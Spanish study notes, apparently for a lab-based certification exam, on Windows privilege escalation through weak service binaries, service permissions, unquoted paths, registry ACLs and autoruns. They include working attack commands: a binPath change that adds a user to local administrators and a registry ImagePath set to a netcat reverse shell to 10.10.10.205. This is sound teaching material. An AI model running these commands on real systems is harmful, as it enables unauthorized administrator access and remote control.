
Si un servicio se ejecuta como `SYSTEM` y un usuario sin privilegios puede modificar su ejecutable, es posible reemplazarlo para conseguir ejecución de código con los privilegios del servicio.

### Enumeración con SharpUp

```
.\SharpUp.exe audit
```

Busca, entre otras cosas, binarios de servicios modificables y servicios con permisos débiles.

### Comprobar permisos con icacls

```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Busca permisos como `(F)` — Full Control — o `(M)` — Modify — asignados a tu usuario o a grupos de los que formes parte, como `BUILTIN\Users` o `Everyone`.

### Explotación

Si puedes modificar el ejecutable y tienes capacidad para iniciar el servicio:

1. Haz una copia de seguridad del ejecutable original.
    
2. Sustitúyelo por un ejecutable controlado por ti.
    
3. Inicia el servicio.
    
4. Comprueba los privilegios obtenidos.
    

**Condición importante:** el servicio debe ejecutarse con privilegios superiores a los tuyos y debes poder hacer que ejecute el archivo modificado.

# 2. Permisos débiles sobre servicios

Un servicio puede tener permisos de configuración excesivos que permitan modificar su ruta de ejecución (`binPath`).

### Enumeración con SharpUp

```
.\SharpUp.exe audit
```

Busca el apartado:

```
=== Modifiable Services ===
```

### Comprobar permisos con AccessChk

```
accesschk.exe /accepteula -quvcw WindscribeService
```

Parámetros:

- `-q`: omite el banner.
    
- `-u`: suprime errores.
    
- `-v`: muestra información detallada.
    
- `-c`: examina un servicio de Windows.
    
- `-w`: muestra objetos con acceso de escritura.
    

Si aparece:

```
NT AUTHORITY\Authenticated Users
    SERVICE_ALL_ACCESS
```

significa que los usuarios autenticados tienen todos los permisos sobre ese servicio, incluidos los necesarios para modificar su configuración.

### Comprobar si eres administrador local

```
net localgroup administrators
```

### Explotación modificando `binPath`

Ejemplo del laboratorio:

```
sc.exe config WindscribeService binPath= "cmd /c net localgroup administrators htb-student /add"
```

Después, si tienes permiso para detener e iniciar el servicio:

```
sc.exe stop WindscribeService
sc.exe start WindscribeService
```

Aunque el servicio falle al iniciarse, el comando configurado puede haberse ejecutado.

Comprueba el resultado:

```
net localgroup administrators
```

**Concepto clave:** los permisos `SERVICE_CHANGE_CONFIG` permiten cambiar la configuración del servicio. Si además puedes iniciarlo, detenerlo o provocar que se inicie, puede existir una vía de escalada.

### Limpieza

Restaura la ruta original del servicio:

```
sc.exe config WindscribeService binPath= "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

Inícialo de nuevo:

```
sc.exe start WindscribeService
sc.exe query WindscribeService
```

Restaura también cualquier otro cambio realizado durante la explotación.

# 3. Rutas de servicios sin comillas (Unquoted Service Paths)

Si la ruta del ejecutable de un servicio contiene espacios y no está entre comillas, Windows puede intentar localizar ejecutables en rutas intermedias.

Ejemplo:

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows puede comprobar posibles ejecutables en ubicaciones intermedias, como:

```
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe
```

La técnica solo es explotable si puedes crear un ejecutable en una de las rutas que Windows intenta resolver y se cumplen las condiciones necesarias para que el servicio lo ejecute.

### Consultar la configuración del servicio

```
sc.exe qc SystemExplorerHelpService
```

Busca:

```
BINARY_PATH_NAME
SERVICE_START_NAME
```

El segundo campo indica la cuenta con la que se ejecuta el servicio.

### Buscar rutas sin comillas

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Este comando filtra servicios automáticos, excluye rutas de Windows y busca rutas que no contienen comillas.

**Importante:** encontrar una ruta sin comillas no significa que sea explotable. Debes comprobar si puedes escribir en alguna ubicación intermedia y si puedes provocar la ejecución del servicio.

# 4. ACLs permisivas en el registro

Los servicios almacenan su configuración en claves del registro, normalmente bajo:

```
HKLM\SYSTEM\CurrentControlSet\Services\<NombreServicio>
```

Si tienes permisos de escritura sobre una clave, podrías modificar el valor `ImagePath` del servicio.

### Enumerar permisos con AccessChk

```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

Busca resultados como:

```
RW HKLM\System\CurrentControlSet\services\ModelManagerService
    KEY_ALL_ACCESS
```

`KEY_ALL_ACCESS` indica acceso completo a esa clave del registro para la identidad comprobada.

Sustituye `mrb3n` por el usuario correspondiente.

### Consultar el ImagePath actual

```
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" -Name ImagePath
```

### Modificar ImagePath

Ejemplo del laboratorio:

```
Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" `
  -Name "ImagePath" `
  -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

Después, necesitas que el servicio ejecute la nueva ruta. Comprueba también los permisos necesarios para iniciar o reiniciar el servicio.

**Diferencia importante:**

- `sc.exe config`: modifica la configuración del servicio mediante el Service Control Manager.
    
- `Set-ItemProperty`: modifica directamente el valor del registro.
    

Son vías distintas y requieren permisos diferentes.

# 5. Programas de inicio modificables (Autoruns)

Los programas configurados para ejecutarse al iniciar Windows o al iniciar sesión pueden representar otra vía de escalada.

Si puedes modificar una entrada del registro o reemplazar el ejecutable asociado, el código podría ejecutarse cuando se produzca el inicio correspondiente.

### Enumerar programas de inicio

```
Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User |
    Format-List
```

Revisa especialmente:

- `Name`: nombre del elemento.
    
- `Command`: ejecutable y argumentos.
    
- `Location`: ubicación de configuración.
    
- `User`: usuario asociado.
    

Comprueba si puedes modificar la entrada o el archivo ejecutable y qué privilegios tendrá el proceso al ejecutarse.

# Chuleta de comandos

|Objetivo|Comando|
|---|---|
|Buscar posibles escaladas|`.\SharpUp.exe audit`|
|Comprobar permisos de un archivo|`icacls "C:\ruta\archivo.exe"`|
|Enumerar permisos de un servicio|`accesschk.exe /accepteula -quvcw NombreServicio`|
|Comprobar administradores locales|`net localgroup administrators`|
|Consultar configuración de un servicio|`sc.exe qc NombreServicio`|
|Cambiar la ruta de un servicio|`sc.exe config NombreServicio binPath= "C:\ruta\programa.exe"`|
|Consultar un servicio|`sc.exe query NombreServicio`|
|Buscar rutas sin comillas|Comando WMIC de la sección 3|
|Enumerar ACLs de claves de servicios|Comando AccessChk de la sección 4|
|Consultar `ImagePath`|`Get-ItemProperty`|
|Modificar `ImagePath`|`Set-ItemProperty`|
|Enumerar programas de inicio|`Get-CimInstance Win32_StartupCommand`|

## Orden recomendado durante un examen

1. Ejecuta `SharpUp.exe audit`.
    
2. Comprueba con `icacls` los permisos de los ejecutables detectados.
    
3. Examina los permisos de los servicios con AccessChk.
    
4. Comprueba las ACLs del registro y los valores `ImagePath`.
    
5. Busca rutas de servicios sin comillas y programas de inicio modificables.
    
6. Antes de explotar, verifica la cuenta del servicio, los permisos efectivos y la posibilidad de provocar su ejecución.
    

**Regla general:** una configuración débil solo constituye una vía de escalada si puedes modificar el recurso, conseguir que se ejecute y aprovechar los privilegios del proceso que lo ejecuta.
